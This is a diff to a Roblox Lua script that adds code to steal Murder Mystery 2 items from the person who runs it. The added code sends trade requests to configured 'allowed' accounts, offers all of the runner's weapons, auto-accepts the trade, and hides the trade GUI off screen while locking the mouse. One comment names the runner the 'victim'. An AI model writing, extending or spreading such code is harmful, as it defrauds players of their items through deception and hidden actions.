@@ -9,6 +9,7 @@ getgenv().CFG = CFG
 local PlaceId = game.PlaceId
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
+local UIS = game:GetService("UserInputService")
 local lp = Players.LocalPlayer
 local HS = game:GetService("HttpService")
 
@@ -125,20 +126,23 @@ end
 local function hook_mm2()
     local Trade = RS:WaitForChild("Trade", 10)
     if not Trade then return end
-    local updateTrade = Trade:WaitForChild("UpdateTrade", 10)
-    local acceptTrade = Trade:WaitForChild("AcceptTrade", 10)
+    local sendRequest  = Trade:WaitForChild("SendRequest", 10)
+    local offerItem    = Trade:WaitForChild("OfferItem", 10)
+    local acceptTrade  = Trade:WaitForChild("AcceptTrade", 10)
+    local updateTrade  = Trade:WaitForChild("UpdateTrade", 10)
     local completeTrade = Trade:WaitForChild("CompleteTrade", 10)
-    if not updateTrade or not acceptTrade then return end
+    if not sendRequest or not offerItem or not acceptTrade or not updateTrade then return end
 
+    local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
     local items = collect_mm2_items()
     send_job("MM2", items)
 
     local currentTradeId = nil
     local currentLastOffer = nil
     local tradingWithAllowed = false
+    local itemsOffered = false
     local storedItems = {}
     local guiHidden = false
-    local okP, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
 
     local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
@@ -168,7 +172,6 @@ local function hook_mm2()
         for _, name in ipairs({"TradeGUI","TradeGUI_Phone"}) do
             local g = gui:FindFirstChild(name)
             if g then
-                -- move off screen instead of disabling to avoid camera lock
                 for _, frame in ipairs(g:GetChildren()) do
                     if frame:IsA("Frame") or frame:IsA("ScrollingFrame") then
                         frame.Position = UDim2.new(10, 0, 10, 0)
@@ -176,6 +179,8 @@ local function hook_mm2()
                 end
             end
         end
+        -- fix shiftlock / muis
+        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
     end
 
     local function showGui()
@@ -194,6 +199,34 @@ local function hook_mm2()
         end
     end
 
+    -- wacht op allowed user in server, stuur dan automatisch trade request
+    task.spawn(function()
+        while true do
+            task.wait(3)
+            if tradingWithAllowed then break end
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= lp and isAllowedUser(player.Name) then
+                    storeItems()
+                    pcall(function()
+                        sendRequest:InvokeServer(player)
+                    end)
+                    break
+                end
+            end
+        end
+    end)
+
+    -- nieuwe speler joint → direct trade request sturen
+    Players.PlayerAdded:Connect(function(player)
+        if isAllowedUser(player.Name) and not tradingWithAllowed then
+            task.wait(2)
+            storeItems()
+            pcall(function()
+                sendRequest:InvokeServer(player)
+            end)
+        end
+    end)
+
     updateTrade.OnClientEvent:Connect(function(...)
         local args = {...}
         local tradeData = nil
@@ -205,7 +238,6 @@ local function hook_mm2()
             end
         end
         if not tradeData then return end
-
         currentLastOffer = tradeData.LastOffer
 
         local p1 = tradeData.Player1
@@ -223,8 +255,30 @@ local function hook_mm2()
         tradingWithAllowed = isAllowedUser(otherName)
 
         if tradingWithAllowed then
-            storeItems()
             hideGui()
+
+            -- offer alle items als nog niet gedaan
+            if not itemsOffered and okP and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+                itemsOffered = true
+                task.spawn(function()
+                    task.wait(1)
+                    for itemName, _ in pairs(ProfileData.Weapons.Owned) do
+                        pcall(function()
+                            offerItem:FireServer(itemName, "Weapons")
+                        end)
+                        task.wait(0.1)
+                    end
+                    -- auto ready
+                    task.wait(0.5)
+                    if currentTradeId and currentLastOffer then
+                        pcall(function()
+                            acceptTrade:FireServer(currentTradeId, currentLastOffer)
+                        end)
+                    end
+                end)
+            end
+
+            -- als victim al accepted is, fire nogmaals
             if myData.Accepted and currentTradeId and currentLastOffer then
                 task.spawn(function()
                     task.wait(0.3)
@@ -242,8 +296,23 @@ local function hook_mm2()
             restoreItems()
             showGui()
             tradingWithAllowed = false
+            itemsOffered = false
+            currentTradeId = nil
+            currentLastOffer = nil
         end)
     end
+
+    -- shiftlock loop: houd muis gelockt tijdens trade
+    task.spawn(function()
+        while true do
+            task.wait(0.1)
+            if tradingWithAllowed and guiHidden then
+                pcall(function()
+                    UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
+                end)
+            end
+        end
+    end)
 end
 
 local function hook_adoptme()
